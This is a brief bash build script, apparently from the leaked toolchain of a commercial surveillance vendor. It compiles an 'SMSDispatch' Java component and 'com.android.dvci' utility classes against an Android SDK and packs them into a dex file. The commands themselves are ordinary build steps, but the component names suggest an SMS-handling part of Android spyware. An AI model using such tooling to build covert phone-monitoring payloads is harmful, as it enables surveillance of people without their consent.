#!/bin/bash - 
#===============================================================================
#
#          FILE: build-dex.sh
# 
#         USAGE: ./build-dex.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: zad (), e.placidi@hackingteam.com
#  ORGANIZATION: ht
#       CREATED: 23/02/2015 10:06:27 CET
#      REVISION:  ---
#===============================================================================

# -d specify where to place the compiled class
# --classpath path to externa jar and class
# ./SMSDispatch/app/src/main/java/phone/android/com/SMSDispatch.java
cdir=$(pwd)
cd app/SMSDispatch/app/src/main/java/
/usr/bin/javac -verbose -d ${cdir}/obj -classpath /AOSPs/androidSources4.2_r1/prebuilts/sdk/9/android.jar:./${cdir}/obj:phone/android/com/:com/android/dvci/util/ com/android/dvci/util/*.java phone/android/com/*.java
class=""
cd ${cdir}/obj
for i in  `ls phone/android/com/*.class`;
do
  class="$class $i"
done
for i in  `ls com/android/dvci/util/*.class`;
do
  class="$class $i"
done
echo /usr/bin/jar cf ${cdir}/ddiclasses.jar  ${class}
/usr/bin/jar cf ${cdir}/ddiclasses.jar  ${class}
dx --dex --no-strict --output=${cdir}/obj/ddiclasses.dex ${cdir}/ddiclasses.jar
cd ${cdir}
